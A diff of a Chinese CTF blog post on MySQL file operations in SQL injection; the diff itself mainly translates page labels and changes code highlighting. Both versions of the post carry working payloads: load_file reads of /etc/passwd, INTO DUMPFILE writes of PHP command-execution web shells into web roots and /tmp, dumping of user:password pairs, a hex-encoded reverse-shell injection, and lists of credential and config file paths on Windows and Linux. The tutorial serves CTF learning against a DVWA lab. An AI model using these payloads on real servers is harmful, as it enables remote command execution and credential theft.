@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="啦啦菌NODE">
 <meta property="og:description" content="—  从零开始的笔记  —— sql文件操作及过滤 —">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2017-12-06T10:43:23.346Z">
+<meta property="og:updated_time" content="2018-04-09T07:24:59.425Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB-CTF中的SQL文件操作">
 <meta name="twitter:description" content="—  从零开始的笔记  —— sql文件操作及过滤 —">
@@ -145,13 +145,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
+                        <li>Menu</li>
+                        <li>Tags</li>
                         
-                        <li>友情链接</li>
+                        <li>Friends</li>
                         
                         
-                        <li>关于我</li>
+                        <li>About Me</li>
                         
                     </ul>
                 </div>
@@ -269,7 +269,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
       <div class="body-wrap"><article id="post-WEB-CTF中的SQL文件操作" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -320,17 +320,17 @@
 <li>必须有FILE权限 </li>
 <li>文件内容必须小于max_allowed_packet （show VARIABLES like ‘%max_allowed_packet%’; 查看）</li>
 </ul>
-<p>使用格式：<strong>load_file(‘路径’)</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#windows</span></div><div class="line">select load_file(<span class="string">'d:/kali.txt'</span>)             <span class="comment">#路径为单引号Str，斜杠是/而不是\</span></div><div class="line">select load_file(0x643a2f6b616c692e747874)  <span class="comment">#路径为0x16进制Str</span></div><div class="line">select load_file(char(99,58,47,98....))     <span class="comment">#路径为char转换的字符</span></div><div class="line"><span class="comment">#linux</span></div><div class="line">select load_file（<span class="string">'/etc/passwd'</span>）</div></pre></td></tr></table></figure></p>
+<p>使用格式：<strong>load_file(‘路径’)</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#windows</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'d:/kali.txt'</span>)             #路径为单引号<span class="keyword">Str</span>，斜杠是/而不是\</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="number">0x643a2f6b616c692e747874</span>)  #路径为<span class="number">0x16</span>进制<span class="keyword">Str</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98.</span>...))     #路径为<span class="built_in">char</span>转换的字符</div><div class="line">#linux</div><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>（<span class="string">'/etc/passwd'</span>）</div></pre></td></tr></table></figure></p>
 <p><strong>关于过滤：</strong><br>防止文件中有截断：hex(load_file(‘文件地址’))</p>
-<h3 id="写入文件-INTO-DUMPFILE"><a href="#写入文件-INTO-DUMPFILE" class="headerlink" title="写入文件 INTO DUMPFILE"></a>写入文件 INTO DUMPFILE</h3><p>使用格式：<strong>“内容” INTO DUMPFILE “路径”</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#windows</span></div><div class="line">select <span class="string">"&lt;?php system(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"D:/PHP/WWW/cmd.php"</span></div><div class="line"><span class="comment">#linux</span></div><div class="line">select <span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"/var/www/a.php"</span>  </div><div class="line"> <span class="comment">#下一条默认保存在/var/lib/mysql/dvwa/a.php （默认保存路径根据系统用户而定）</span></div><div class="line"> <span class="comment">#（/var/lib/mysql 是 mysql的主目录，dvwa是SQL注入漏洞的网站主目录）</span></div><div class="line">select <span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"a.php"</span>       </div><div class="line">select <span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span> INTO DUMPFILE <span class="string">"/tmp/a.php"</span></div></pre></td></tr></table></figure></p>
+<h3 id="写入文件-INTO-DUMPFILE"><a href="#写入文件-INTO-DUMPFILE" class="headerlink" title="写入文件 INTO DUMPFILE"></a>写入文件 INTO DUMPFILE</h3><p>使用格式：<strong>“内容” INTO DUMPFILE “路径”</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#windows</div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php system($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"D:/PHP/WWW/cmd.php"</span></div><div class="line">#linux</div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php passthru($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"/var/www/a.php"</span>  </div><div class="line"> #下一条默认保存在/<span class="keyword">var</span>/lib/mysql/dvwa/a.php （默认保存路径根据系统用户而定）</div><div class="line"> #（/<span class="keyword">var</span>/lib/mysql 是 mysql的主目录，dvwa是<span class="keyword">SQL</span>注入漏洞的网站主目录）</div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php passthru($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"a.php"</span>       </div><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php passthru($_GET['cmd']); ?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"/tmp/a.php"</span></div></pre></td></tr></table></figure></p>
 <p>因为Linux用户之间的读取，写入，执行权限严格。<br>假设做数据库写入文件操作的用户为MYSQL，而网站目录的用户为WWW。</p>
 <ul>
 <li>第一种情况，mysql用户不能往WWW用户的目录写入文件，我们就无法访问木马文件，从而不能利用。写入无效。</li>
 <li>第二种情况，dvwa目录只有mysql用户和root有权限，www无法进入读写，所以mysql植入木马，www网站也没有权限访问木马。写入成功，执行无效</li>
 <li>第三种情况，tmp目录为所有用户都可以访问的目录（mysql 可以写入，www 可以读出），此时www用户通过文件包含漏洞去“执行”木马<br>ps.(文件包含漏洞是读取文件进来执行，不是真正的需要对文件执行权限)</li>
 </ul>
-<p>此外，还可以查询数据存至目标主机，再加以利用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select concat(user,0x3a,password) from users INTO OUTFILE <span class="string">'/tmp/a.db'</span></div></pre></td></tr></table></figure></p>
-<p><strong>关于过滤：</strong><br>文件转为16进制（INTO DUMPFILE会自动变为正常字符保存）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat php-reverse-shell.php | xxd -ps     </div><div class="line"><span class="comment">#用xxd进行16进制显示，但是每一行长固定，后面有换行符，sql无法翻译</span></div><div class="line">cat php-reverse-shell.php | xxd -ps | tr -d <span class="string">'\n'</span>    用xxd进行16进制显示，删除换行符</div><div class="line">ps. php-reverse-shell.php 木马文件太大 url长度限制 无法上传 可换小型php木马</div><div class="line">	<span class="string">' union select null,(空格)(0xcccccc) INTO DUMPFILE "/tmp/1.php" --+</span></div><div class="line"><span class="string">ps. 注意 文件16进制编码填入cccccc</span></div></pre></td></tr></table></figure></p>
+<p>此外，还可以查询数据存至目标主机，再加以利用<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="number">0x3a</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/tmp/a.db'</span></div></pre></td></tr></table></figure></p>
+<p><strong>关于过滤：</strong><br>文件转为16进制（INTO DUMPFILE会自动变为正常字符保存）<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat php-reverse-shell.php | xxd -ps     </div><div class="line">#用xxd进行16进制显示，但是每一行长固定，后面有换行符，sql无法翻译</div><div class="line">cat php-reverse-shell.php | xxd -ps | tr -d '\n'    用xxd进行16进制显示，删除换行符</div><div class="line">ps. php-reverse-shell.php 木马文件太大 url长度限制 无法上传 可换小型php木马</div><div class="line">	' union <span class="keyword">select</span> <span class="literal">null</span>,(空格)(<span class="number">0xcccccc</span>) <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">"/tmp/1.php"</span> <span class="comment">--+</span></div><div class="line">ps. 注意 文件<span class="number">16</span>进制编码填入cccccc</div></pre></td></tr></table></figure></p>
 <h3 id="常用路径"><a href="#常用路径" class="headerlink" title="常用路径"></a>常用路径</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">#查看系统版本</div><div class="line">    c:/boot.ini</div><div class="line">#php配置信息</div><div class="line">    c:/windows/php.ini</div><div class="line">#MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</div><div class="line">    c:/windows/my.ini</div><div class="line">    c:/winnt/php.ini</div><div class="line">    c:/winnt/my.ini</div><div class="line">#存储了mysql.user表中的数据库连接密码</div><div class="line">    c:\mysql\data\mysql\user.MYD </div><div class="line">#存储了虚拟主机网站路径和密码</div><div class="line">    c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini </div><div class="line">    c:\Program Files\Serv-U\ServUDaemon.ini</div><div class="line">#查看IIS的虚拟主机配置</div><div class="line">    c:\windows\system32\inetsrv\MetaBase.xml </div><div class="line">#存储了WINDOWS系统初次安装的密码</div><div class="line">    c:\windows\repair\sam </div><div class="line">#6.0版本以前的serv-u管理员密码存储于此</div><div class="line">    c:\Program Files\ Serv-U\ServUAdmin.exe </div><div class="line">    c:\Program Files\RhinoSoft.com\ServUDaemon.exe</div><div class="line">#存储了pcAnywhere的登陆密码</div><div class="line">    C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</div><div class="line">#查看WINDOWS系统apache文件</div><div class="line">    c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf</div><div class="line">#查看jsp开发的网站 resin文件配置信息.</div><div class="line">    c:/Resin-3.0.14/conf/resin.conf </div><div class="line">#查看linux系统配置的JSP虚拟主机</div><div class="line">    c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf </div><div class="line">    d:\APACHE\Apache2\conf\httpd.conf</div><div class="line">    C:\Program Files\mysql\my.ini</div><div class="line">#存在MYSQL系统中的用户密码</div><div class="line">    C:\mysql\data\mysql\user.MYD</div></pre></td></tr></table></figure>
 <h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">#apache2缺省配置文件</div><div class="line">    /usr/local/app/apache2/conf/httpd.conf </div><div class="line">    /usr/local/apache2/conf/httpd.conf</div><div class="line">#虚拟网站设置</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#PHP相关设置</div><div class="line">    /usr/local/app/php5/lib/php.ini </div><div class="line">#从中得到防火墙规则策略</div><div class="line">    /etc/sysconfig/iptables </div><div class="line">#apache配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf</div><div class="line">#同步程序配置文件</div><div class="line">    /etc/rsyncd.conf </div><div class="line">#mysql的配置文件</div><div class="line">    /etc/my.cnf </div><div class="line">#系统版本</div><div class="line">    /etc/redhat-release </div><div class="line">    /etc/issue</div><div class="line">    /etc/issue.net</div><div class="line">#PHP相关设置</div><div class="line">    /usr/local/app/php5/lib/php.ini</div><div class="line">#虚拟网站设置</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#查看linux APACHE虚拟主机配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf </div><div class="line">#针对3.0.22的RESIN配置文件查看</div><div class="line">    /usr/local/resin-3.0.22/conf/resin.conf</div><div class="line">    /usr/local/resin-pro-3.0.22/conf/resin.conf </div><div class="line">#APASHE虚拟主机查看</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf </div><div class="line">#查看linux APACHE虚拟主机配置文件</div><div class="line">    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf </div><div class="line">#针对3.0.22的RESIN配置文件查看</div><div class="line">    /usr/local/resin-3.0.22/conf/resin.conf </div><div class="line">    /usr/local/resin-pro-3.0.22/conf/resin.conf</div><div class="line">#APASHE虚拟主机查看</div><div class="line">    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf</div></pre></td></tr></table></figure>
 
@@ -341,17 +341,17 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
-        <p><span>发布时间:</span>2017-12-05, 15:08:41</p>
-        <p><span>最后更新:</span>2017-12-06, 18:43:23</p>
+        <p><span>Title:</span><a href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">LaLa</a></p>
+        <p><span>Created:</span>2017-12-05, 15:08:41</p>
+        <p><span>Updated:</span>2018-04-09, 15:24:59</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/12/05/WEB-CTF中的SQL文件操作/" title="WEB-CTF中的SQL文件操作">http://lalajun.com/2017/12/05/WEB-CTF中的SQL文件操作/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2017/12/05/WEB-CTF中的SQL文件操作/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2017/12/05/WEB-CTF中的SQL文件操作/" title="WEB-CTF中的SQL文件操作">http://lalajun.com/2017/12/05/WEB-CTF中的SQL文件操作/</a>
+            <span class="copy-path" data-clipboard-text="From http://lalajun.com/2017/12/05/WEB-CTF中的SQL文件操作/　　By LaLa" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
         </p>
     </div>
 
@@ -378,7 +378,7 @@
 </article>
 
     <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
+        <strong class="toc-title">Contents</strong>
         
             <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL文件操作"><span class="toc-text">SQL文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#读取文件-load-file"><span class="toc-text">读取文件 load_file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写入文件-INTO-DUMPFILE"><span class="toc-text">写入文件 INTO DUMPFILE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用路径"><span class="toc-text">常用路径</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li></ol></li></ol></li></ol>
         
@@ -394,10 +394,10 @@
         }
     </style>
 
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
 
     <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
     </script>
 
 
@@ -411,21 +411,21 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/12/27/比特币&区块链与挖矿/" title="上一篇: 比特币&amp;区块链与挖矿">
+            <a href="/2017/12/27/比特币&区块链与挖矿/" title="Pre: 比特币&amp;区块链与挖矿">
                 <i class="fa fa-angle-left"></i>
             </a>
         
 
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/10/19/WEB-CTF中的绕过/" title="下一篇: WEB-CTF中的绕过">
+            <a href="/2017/10/19/WEB-CTF中的绕过/" title="Next: WEB-CTF中的绕过">
                 <i class="fa fa-angle-right"></i>
             </a>
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
 
 
 
@@ -442,14 +442,14 @@
                 2017-2018 LaLa
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -458,7 +458,7 @@
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -491,9 +491,9 @@
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
